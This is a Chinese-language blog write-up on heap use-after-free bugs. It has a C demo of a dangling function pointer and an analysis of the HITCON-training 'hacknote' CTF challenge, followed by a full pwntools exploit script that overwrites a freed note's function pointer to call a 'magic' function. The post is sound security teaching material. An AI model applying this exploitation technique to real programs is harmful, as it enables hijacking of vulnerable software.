    <content type="html"><![CDATA[<hr><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><ul><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">相关博文</a></li><li><a href="https://zhangyan8216.github.io/">个人博客首页</a></li><li>注：学习交流使用！</li></ul><hr><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为NULL的内存指针为dangling pointer。</strong><br>举个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">name</span> &#123;</span><br>  <span class="hljs-type">char</span> *myname;<br>  <span class="hljs-type">void</span> (*func)(<span class="hljs-type">char</span> *str);<br>&#125; NAME;<br><span class="hljs-type">void</span> <span class="hljs-title function_">myprint</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span> &#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, str); &#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">printmyname</span><span class="hljs-params">()</span> &#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call print my name\n&quot;</span>); &#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  NAME *a;<br>  a = (NAME *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> name));<br>  a-&gt;func = myprint;<br>  a-&gt;myname = <span class="hljs-string">&quot;I can also use it&quot;</span>;<br>  a-&gt;func(<span class="hljs-string">&quot;this is my function&quot;</span>);<br>  <span class="hljs-comment">// free without modify</span><br>  <span class="hljs-built_in">free</span>(a);<br>  a-&gt;func(<span class="hljs-string">&quot;I can also use it&quot;</span>);<br>  <span class="hljs-comment">// free with modify</span><br>  a-&gt;func = printmyname;<br>  a-&gt;func(<span class="hljs-string">&quot;this is my function&quot;</span>);<br>  <span class="hljs-comment">// set NULL</span><br>  a = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;this pogram will crash...\n&quot;</span>);<br>  a-&gt;func(<span class="hljs-string">&quot;can not be printed...&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  use_after_free git:(use_after_free) ✗ ./use_after_free                      <br>this is my function<br>I can also use it<br>call print my name<br>this pogram will crash...<br>[1]    38738 segmentation fault (core dumped)  ./use_after_free<br></code></pre></td></tr></table></figure><hr><h2 id="具体实例"><a href="#具体实例" class="headerlink" title="具体实例"></a>具体实例</h2><ul><li><p>[题目地址]：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote/hacknote">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote/hacknote</a></p><h2 id="利用分析-："><a href="#利用分析-：" class="headerlink" title="利用分析 ："></a>利用分析 ：</h2><p>我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个 magic 函数，我们有没有可能来通过 use after free 来使得这个程序执行 magic 函数呢？一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。 那么该怎么执行呢？</p></li></ul><p>我们可以简单来看一下每一个 note 生成的具体流程</p><p>程序申请 8 字节内存用来存放 note 中的 put 以及 content 指针。<br>程序根据输入的 size 来申请指定大小的内存，然后用来存储 content。</p><p>   +—————–+<br>   |   put           |<br>   +—————–+<br>   |   content       |       size<br>   +—————–+——————-&gt;+—————-+<br>                                          |     real       |<br>                                          |    content     |<br>                                          |                |<br>                                          +—————-+<br>那么，根据我们之前在堆的实现中所学到的，显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下</p><p>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）<br>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）<br>释放 note0<br>释放 note1<br>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0<br>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则<br>note2 其实会分配 note1 对应的内存块。<br>real content 对应的 chunk 其实是 note0。<br>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</p><h2 id="exp脚本"><a href="#exp脚本" class="headerlink" title="exp脚本"></a>exp脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#!/usr/bin/env python</span><br><br>-*- coding: utf-<span class="hljs-number">8</span> -*-<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;./hacknote&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addnote</span>(<span class="hljs-params">size, content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delnote</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printnote</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br><span class="hljs-comment">#gdb.attach(r)</span><br>magic = <span class="hljs-number">0x08048986</span><br><br>addnote(<span class="hljs-number">32</span>, <span class="hljs-string">&quot;aaaa&quot;</span>) <span class="hljs-comment"># add note 0</span><br>addnote(<span class="hljs-number">32</span>, <span class="hljs-string">&quot;ddaa&quot;</span>) <span class="hljs-comment"># add note 1</span><br><br>delnote(<span class="hljs-number">0</span>) <span class="hljs-comment"># delete note 0</span><br>delnote(<span class="hljs-number">1</span>) <span class="hljs-comment"># delete note 1</span><br><br>addnote(<span class="hljs-number">8</span>, p32(magic)) <span class="hljs-comment"># add note 2</span><br><br>printnote(<span class="hljs-number">0</span>) <span class="hljs-comment"># print note 0</span><br><br>r.interactive()<br><br></code></pre></td></tr></table></figure><hr><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">参考资料1</a></li><li>[参考资料2](【XMCVE 2020 CTF Pwn入门课程】<a href="https://www.bilibili.com/video/BV1854y1y7Ro?p=11&vd_source=5b65791e50610a90ef8469865c34baa1">https://www.bilibili.com/video/BV1854y1y7Ro?p=11&amp;vd_source=5b65791e50610a90ef8469865c34baa1</a>)</li></ul><hr><h2 id="作者感慨"><a href="#作者感慨" class="headerlink" title="作者感慨"></a>作者感慨</h2><p>UAF是堆中的最简单的漏洞，是基础。</p><p>但是它真的不简单，挺难的。</p><p>但还是那句话张师傅出品，必属精品！！！</p>]]></content>
    
    
    
    <tags>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
